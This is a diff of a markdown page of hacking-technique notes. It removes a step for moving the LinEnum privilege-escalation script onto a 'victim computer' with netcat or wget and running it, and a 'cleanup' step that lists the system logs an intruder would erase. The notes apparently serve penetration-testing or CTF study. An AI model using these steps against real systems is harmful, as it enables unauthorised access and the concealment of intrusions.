@@ -1,26 +1,5 @@
 # Techniques used by cyber hackers
 
-<details class="details-e">
-<summary>Step 😎: use LinEnum</summary>
-
-[LinEnum.sh](https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh) ([LineEnum GitHub](https://github.com/rebootuser/LinEnum/)) is a script doing most of the check mentioned above, and many more. You need to add it on the victim computer,
-
-* Try wget
-* Try a text editor (ex: nano), and copy+paste
-* Try FTP
-* Try using nc/netcat (victim: `nc -l -p port > LinEnum.sh`, attacker: `nc IP 1337 < LinEnum.sh`)
-
-Then simply do `chmod +x LinEnum.sh`, and `./LinEnum.sh`.
-</details>
-
-<details class="details-e">
-<summary>Step cleanup</summary>
-
-* `/var/log/auth.log`: ssh logs
-* `/var/log/syslog`: firewall logs
-* `/var/log/service`: "service" logs (ex: apache)
-</details>
-
 <hr class="sl">
 
 ## SUID exploits
